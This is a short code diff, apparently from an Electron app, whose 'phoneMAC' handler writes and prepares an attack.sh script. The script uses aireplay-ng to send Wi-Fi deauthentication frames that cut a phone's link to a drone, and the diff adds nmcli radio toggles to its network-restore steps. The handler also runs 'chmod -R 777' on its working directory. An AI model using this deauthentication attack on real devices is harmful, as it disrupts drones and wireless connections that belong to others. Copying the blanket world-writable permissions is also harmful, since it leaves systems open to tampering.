@@ -206,7 +206,7 @@ ipcMain.on('phoneMAC', async (event, arg) => {
 
   var content = "#!/bin/bash\naireplay-ng --deauth 35 -a "
   content += droneMacAddress + " -c " + phoneMacAddress + " wlp2s0mon\n"
-  content +="airmon-ng stop wlp2s0mon\nservice network-manager start\nsystemctl restart networking\nservice network-manager start"
+  content +="airmon-ng stop wlp2s0mon\nservice network-manager start\nsystemctl restart networking\nnmcli radio wifi off\nservice network-manager start\nnmcli radio wifi on\nnmcli radio wifi off\nservice network-manager start\nnmcli radio wifi on"
 
   fs.writeFileSync('attack.sh', content)
   const raisePermissions = spawn('/bin/sh', ['-c', 'chmod -R 777 ./'])
